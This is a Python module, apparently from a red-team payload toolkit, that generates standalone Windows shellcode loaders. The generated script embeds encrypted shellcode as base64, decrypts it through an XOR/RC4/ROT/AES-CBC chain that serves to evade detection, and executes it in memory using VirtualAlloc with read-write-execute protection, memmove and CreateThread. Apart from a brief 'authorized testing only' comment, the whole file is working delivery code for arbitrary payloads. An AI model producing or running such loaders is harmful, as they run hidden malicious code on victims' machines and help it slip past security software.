"""
Python loader generator.

Produces a self-contained .py loader that:
  - Embeds the encrypted shellcode as a base64 literal (compact, no escaping).
  - Decrypts through the full chain (XOR / RC4 / ROT pure-Python; AES-256-CBC
    via the Windows BCrypt API through ctypes — no third-party dependency).
  - Executes via VirtualAlloc + memmove + CreateThread (self-process).

Constraints:
  - Targets Windows (ctypes.windll).  AES uses BCrypt (bcrypt.dll) for the same
    PKCS7/CBC parameters used by the encryption side.
"""

import base64

from ..chain import decryption_stubs_py


def generate(encrypted_bytes: bytes, chain_metadata: list[dict]) -> str:
    """
    Build a complete Python loader script.

    Args:
        encrypted_bytes: Final encrypted shellcode (after full chain).
        chain_metadata:  Per-stage metadata list from chain.apply_chain().

    Returns:
        Complete .py source string.
    """
    helper_fns, call_seq = decryption_stubs_py(chain_metadata)
    sc_b64 = base64.b64encode(encrypted_bytes).decode('ascii')

    return _TEMPLATE.format(
        sc_b64=sc_b64,
        helper_fns=helper_fns,
        call_seq=call_seq,
    )


_TEMPLATE = """\
#!/usr/bin/env python3
# ============================================================
# Python shellcode loader - for authorized testing only
# ============================================================
import base64
import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32
VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
CreateThread = kernel32.CreateThread
CreateThread.restype = wintypes.HANDLE
CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID,
                         wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

{helper_fns}


def run():
    buf = base64.b64decode("{sc_b64}")
{call_seq}
    if not buf:
        return
    size = len(buf)
    ptr = VirtualAlloc(None, size, 0x3000, 0x40)
    if not ptr:
        return
    ctypes.memmove(ptr, buf, size)
    h = CreateThread(None, 0, ptr, None, 0, None)
    WaitForSingleObject(h, 0xFFFFFFFF)


if __name__ == "__main__":
    run()
"""